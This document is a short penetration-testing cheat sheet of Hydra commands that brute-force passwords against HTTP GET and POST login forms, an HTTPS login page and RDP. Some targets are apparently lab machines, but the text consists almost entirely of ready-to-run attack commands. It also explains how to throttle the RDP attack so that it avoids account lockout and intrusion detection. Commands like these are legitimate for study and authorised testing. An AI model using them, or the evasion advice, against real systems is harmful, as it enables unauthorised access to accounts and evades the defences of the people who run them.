
###### GET Request

```
hydra -l <user> -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt <target_ip> -s <target_port> http-get
```
###### POST Request

```
hydra -l <user> -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt <target_ip> -s <target_port> http-post-form 
```

HTTP

```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
```

HTTPS

```
hydra -L users.txt -P passwords.txt streamio.htb https-post-form  "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
```
## Secure Scan RDP

```
hydra -l <user> -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt rdp://<target_ip> -t 1 -W 3
```

-t 1 -> Sets the number of parallel tasks (connections) to 1. This makes the attack very slow and stealthier.
-W 3 -> Sets the wait time between login attempts for each thread to 3 seconds. This further slows
down the attack to avoid triggering account lockout policies or intrusion detection systems.

## User Brute Forcing

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt rdp://192.168.50.202
```